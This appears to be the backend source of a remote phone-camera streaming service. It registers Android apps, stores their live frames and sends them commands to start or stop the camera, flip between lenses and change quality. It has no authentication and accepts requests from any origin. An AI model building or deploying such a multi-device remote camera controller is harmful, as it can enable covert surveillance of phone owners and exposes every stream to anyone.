const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

// ============================================
// STORAGE - Connected devices ke liye
// ============================================
let connectedDevices = [];      // Sabhi connected APKs ki list
let latestFrames = {};          // Har device ka latest frame (MJPEG ke liye)

// ============================================
// MIDDLEWARE
// ============================================
app.use(express.json());
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  next();
});

// ============================================
// API 1: SABHI DEVICES KI LIST (Vercel ke liye)
// ============================================
app.get('/api/devices', (req, res) => {
  const devicesList = connectedDevices.map(device => ({
    device_id: device.id,
    device_name: device.device_name,
    status: "online",
    connected_at: device.connected_at
  }));
  
  res.json({
    success: true,
    total: connectedDevices.length,
    devices: devicesList
  });
});

// ============================================
// API 2: MJPEG FRAME (Vercel yehi use karega stream dikhane ke liye)
// ============================================
app.get('/api/frame.jpg', (req, res) => {
  const deviceId = req.query.device_id;
  
  if(!deviceId) {
    return res.status(400).send('No device_id provided');
  }
  
  const frame = latestFrames[deviceId];
  
  if(frame && frame.data) {
    // Base64 se JPEG buffer mein convert
    let base64Data = frame.data;
    
    // "data:image/jpeg;base64," prefix hatao agar hai to
    if(base64Data.includes('base64,')) {
      base64Data = base64Data.split('base64,')[1];
    }
    
    const imgBuffer = Buffer.from(base64Data, 'base64');
    
    // JPEG image return karo
    res.writeHead(200, {
      'Content-Type': 'image/jpeg',
      'Content-Length': imgBuffer.length,
      'Cache-Control': 'no-cache, no-store, must-revalidate',
      'Pragma': 'no-cache',
      'Expires': '0'
    });
    res.end(imgBuffer);
  } else {
    res.status(404).send('No frame available');
  }
});

// ============================================
// API 3: SPECIFIC DEVICE KA STATUS
// ============================================
app.get('/api/device-status', (req, res) => {
  const deviceId = req.query.device_id;
  const device = connectedDevices.find(d => d.id === deviceId);
  
  if(device) {
    res.json({
      success: true,
      is_online: true,
      device_id: device.id,
      device_name: device.device_name,
      dot: "🟢"
    });
  } else {
    res.json({
      success: true,
      is_online: false,
      device_id: deviceId,
      dot: "🔴"
    });
  }
});

// ============================================
// API 4: COMMAND SEND (Specific device ko)
// ============================================
app.get('/api/command', (req, res) => {
  const command = req.query.cmd;
  const deviceId = req.query.device_id;
  
  if(!deviceId) {
    return res.json({ success: false, error: "No device selected" });
  }
  
  const targetDevice = connectedDevices.find(d => d.id === deviceId);
  
  if(targetDevice) {
    // Sirf is device ko command bhejo
    io.to(targetDevice.socket_id).emit('command', command);
    
    console.log(`🎮 Command '${command}' → ${targetDevice.device_name} (${deviceId})`);
    
    res.json({
      success: true,
      command: command,
      sent_to: targetDevice.device_name,
      device_id: deviceId
    });
  } else {
    res.json({
      success: false,
      error: `Device ${deviceId} not found or offline`
    });
  }
});

// ============================================
// API 5: QUALITY CHANGE (Specific device ko)
// ============================================
app.get('/api/quality', (req, res) => {
  const quality = req.query.quality;
  const deviceId = req.query.device_id;
  
  if(!deviceId || !quality) {
    return res.json({ success: false, error: "Missing device or quality" });
  }
  
  const targetDevice = connectedDevices.find(d => d.id === deviceId);
  
  if(targetDevice) {
    io.to(targetDevice.socket_id).emit('quality', quality);
    
    console.log(`🎥 Quality '${quality}' → ${targetDevice.device_name}`);
    
    res.json({
      success: true,
      quality: quality,
      sent_to: targetDevice.device_name
    });
  } else {
    res.json({ success: false, error: "Device not found" });
  }
});

// ============================================
// API 6: HOME (Server info)
// ============================================
app.get('/', (req, res) => {
  res.json({
    message: "APK Camera Stream Backend is Running",
    version: "1.0",
    online_devices: connectedDevices.length,
    devices: connectedDevices.map(d => ({ id: d.id, name: d.device_name })),
    endpoints: {
      devices: "/api/devices",
      frame: "/api/frame.jpg?device_id=xxx",
      command: "/api/command?cmd=xxx&device_id=xxx",
      quality: "/api/quality?quality=xxx&device_id=xxx",
      status: "/api/device-status?device_id=xxx"
    }
  });
});

// ============================================
// WEBSOCKET (APK se connection handle)
// ============================================
io.on('connection', (socket) => {
  console.log('✅ New APK connection:', socket.id);
  
  let currentDevice = null;
  
  // APK register hota hai (JAB APK OPEN HOTA HAI)
  socket.on('register_device', (data) => {
    const deviceId = data.device_id || data.device || socket.id;
    const deviceName = data.device_name || data.model || "Android Phone";
    
    currentDevice = {
      id: deviceId,
      device_name: deviceName,
      socket_id: socket.id,
      connected_at: new Date().toISOString(),
      last_heartbeat: new Date().toISOString()
    };
    
    // Pehle se connected hai to remove karo
    connectedDevices = connectedDevices.filter(d => d.id !== deviceId);
    connectedDevices.push(currentDevice);
    
    console.log(`\n📱 APK CONNECTED!`);
    console.log(`   Name: ${deviceName}`);
    console.log(`   ID: ${deviceId}`);
    console.log(`   Total online: ${connectedDevices.length}`);
  });
  
  // APK se frame aaya (LIVE STREAM FRAME)
  socket.on('frame', (frameData) => {
    if(currentDevice) {
      latestFrames[currentDevice.id] = {
        data: frameData,
        time: Date.now()
      };
    }
  });
  
  // APK se heartbeat
  socket.on('heartbeat', (data) => {
    if(currentDevice) {
      currentDevice.last_heartbeat = new Date().toISOString();
    }
  });
  
  // APK disconnect (JAB APK BAND HOTA HAI)
  socket.on('disconnect', () => {
    if(currentDevice) {
      console.log(`\n🔴 APK DISCONNECTED!`);
      console.log(`   Name: ${currentDevice.device_name}`);
      console.log(`   ID: ${currentDevice.id}`);
      
      connectedDevices = connectedDevices.filter(d => d.id !== currentDevice.id);
      delete latestFrames[currentDevice.id];
      
      console.log(`   Total online: ${connectedDevices.length}`);
    }
  });
});

// ============================================
// SERVER START
// ============================================
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`
  ═══════════════════════════════════════════════════════
  🚀 APK CAMERA STREAM BACKEND - SERVER STARTED
  ═══════════════════════════════════════════════════════
  
  📡 Port: ${PORT}
  🌐 URL: https://your-project.repl.co
  
  📱 APK CONNECTION:
     • WebSocket: wss://your-project.repl.co
     • Register event: register_device
     • Frame event: frame (Base64 JPEG)
  
  🔗 VERCELL APIs:
     ┌─────────────────────────────────────────────────┐
     │ GET /api/devices          → All devices list    │
     │ GET /api/frame.jpg?id=xx  → MJPEG frame        │
     │ GET /api/command?cmd=xx   → Send command       │
     │ GET /api/quality?q=xx     → Change quality     │
     │ GET /api/device-status?id=xx → Device status   │
     └─────────────────────────────────────────────────┘
  
  🎮 COMMANDS SUPPORTED:
     • start  → Camera ON + Stream start
     • stop   → Camera OFF + Stream band
     • flip   → Front/Back camera switch
     • 140p   → Quality 160x120 (Blurry/Pixelated)
     • 240p   → Quality 320x240 (Medium)
     • 360p   → Quality 480x360 (Clear)
  
  ═══════════════════════════════════════════════════════
  `);
});
